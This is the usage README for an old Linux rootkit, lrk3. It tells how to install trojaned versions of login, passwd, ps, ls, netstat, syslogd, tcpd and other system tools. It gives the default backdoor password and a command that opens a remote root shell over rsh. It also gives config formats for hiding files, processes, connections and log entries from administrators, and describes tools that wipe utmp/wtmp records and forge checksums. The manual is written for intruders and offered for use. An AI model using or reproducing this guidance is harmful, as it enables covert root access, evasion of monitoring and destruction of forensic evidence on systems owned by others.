INSTALLATION
To install this kit in its standard form execute 'make all install'.
To install the shadow kit execute 'make shadow install'.
All of the files/password configuration is in rootkit.h so feel free to
personalise your own version of lrk3 :-) This kit is for linux 2.X kernels 
ONLY so don't complain when nothing works on old systems. 

USAGE
OK I will go thru how to use each program one by one. NOTE when I say password
I mean the rootkit password not your users password (doh!). By default the
rootkit password is lrkr0x.

chfn -		Local user->root. Run chfn then when it asks you for a new name
		enter your password.

chsh -		Local user->root. Run chsh when it asks you for a new shell
		enter your password.

inetd -		Don't even *think* about asking ;-) It ain't that hard..

login -		Allows login to any account with the rootkit password.
		If root login is refused on your terminal login as "rewt".
		Disables history logging when backdoor is used.

ls -		Trojaned to hide specified files and dirs.
		The data file is ROOTKIT_FILES_FILE, defaults to /dev/ptyr.
		All files can be listed with 'ls -/' if SHOWFLAG is enabled.
		(see rootkit.h)
		The format of /dev/ptyr is:
		ptyr
		hack.dir
		w4r3z
		ie. just the filenames. This would hide any files/dirs with the
		names ptyr, hack.dir and w4r3z.

du -		Same as ls, 'cept for du instead :)

ifconfig -	Modified to remove PROMISC flag when sniffing.

netstat -	Modified to remove tcp/udp/sockets from or to specified
		addresses, uids and ports. The file is ROOTKIT_ADDRESS_FILE.
		default data file: /dev/ptyq
		type 0: hide uid
		type 1: hide local address
		type 2: hide remote address
		type 3: hide local port
		type 4: hide remote port
		type 5: hide UNIX socket path

		example:
		0 500           <- Hides all connections by uid 500
		1 128.31        <- Hides all local connections from 128.31.X.X
		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
		3 8000          <- Hides all local connections from port 8000
		4 6667          <- Hides all remote connections to port 6667
		5 .term/socket  <- Hides all UNIX sockets including the path 
				   .term/socket
		
passwd -	Local user->root. Enter your rootkit password instead of your
		old password.

ps -		Modified to remove specified processes.
		The file used is ROOTKIT_PROCESS_FILE, default to /dev/ptyp.
		An example data file is as follows:
        	0 0             Strips all processes running under root
        	1 p0            Strips tty p0
        	2 sniffer       Strips all programs with the name sniffer
		3 hack		Strips all programs with 'hack' in them 
				ie. proghack1, hack.scan, snhack etc.
		Don't put in the comments, obviously. Note: if this doesn't 
		seem to work make sure there are no spaces after the names, 
		and don't use the full path name.

top -		Identical to ps, 'cept for top instead.

rshd -		Execute remote commands as root. 
		Usage: rsh -l rootkitpassword host command
		ie. rsh -l lrkr0x cert.org /bin/sh -i
		    would start a root shell.

syslogd -	Modified to remove specified strings from logging.
		The data file is ROOTKIT_LOG_FILE, this defaults to /dev/ptys.
		Example data file:
		evil.com
		123.100.101.202
		rshd
		This would remove all logs containing the strings evil.com,
		123.100.101.202 and rshd.

tcpd -		Modified to allow access from your host without any logging. 
		Any type 1 record in the ROOTKIT_ADDRESS_FILE is used for 
		tcpd. See netstat for more infoz on this file.
		Example data file:
		1 123.4.5.6
		would set up the tcp wrappers to allow and hide connects from 
		123.4.5.6.

linsniffer -	A kewl packet sniffer. U might like to check out another 
		sniffer for linux if this doesn't suit ya needs.
		(ie. sniffit, pcs, snoofer, whatver). I removed sniffit for 
                space reasons, if you want it the latest version can be found 
                at http://reptile.rug.ac.be/~coder/sniffit/sniffit.html
 
fix -		Replaces and fixes timestamp/checksum infomation on files.
		New lrk3 version :-)

z2 -		Zapper2! Run this to erase the last utmp/wtmp/lastlog entries
		for a username. This can be detected since it just nulls the
		entry out.

wted -		This does lots of stuff. U can view ALL the entries in a wtmp
		or utmp type file, erase entries by username or hostname,
		view zapped users (admins use a util similar to this to find
		erased entries), erase zapped users etc.
